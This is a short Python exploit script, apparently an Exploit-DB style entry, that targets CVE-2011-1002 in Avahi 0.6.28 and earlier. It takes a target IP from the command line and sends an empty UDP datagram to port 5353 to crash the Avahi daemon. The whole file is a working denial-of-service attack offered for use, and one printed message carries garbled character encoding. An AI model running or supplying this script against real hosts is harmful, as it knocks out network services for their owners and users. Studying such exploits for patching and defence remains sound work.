#!/usr/bin/env python3
# Exploit Title: Avahi 0.6.28 Denial of Service Vulnerability
# Date: 3/3/2011
# Author: MaYaSeVeN
# Editor: Howert
# Blog: http://mayaseven.blogspot.com
# Video: [PoC] http://www.youtube.com/user/mayaseven
# Version: avahi <= 0.6.28
# Tested on: Debian 6 (Squeeze) & Ubuntu 10.10
# CVE: CVE-2011-1002

import socket
import sys

if len(sys.argv) != 2:
    print("Usage: avahi_DoS.py {Target IP}")
    sys.exit(1)

target_ip = sys.argv[1]

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(b'', (target_ip, 5353))
    print("Exploit tamamlandÄ±.")
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    sock.close()
